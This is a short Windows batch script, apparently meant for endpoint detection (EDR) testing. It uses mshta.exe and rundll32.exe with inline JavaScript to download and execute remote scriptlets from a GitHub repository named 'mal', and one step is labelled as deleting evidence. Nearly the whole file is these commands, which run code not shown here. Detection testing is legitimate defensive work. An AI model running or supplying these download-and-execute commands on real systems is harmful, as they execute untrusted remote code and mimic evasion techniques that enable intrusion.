echo EDR test powershell activity
mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/sgmr-gr/mal/main/edrtest2.sct")).Exec();close()
timeout 5
echo EDR test delete evidence
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/sgmr-gr/mal/main/edrtest3")
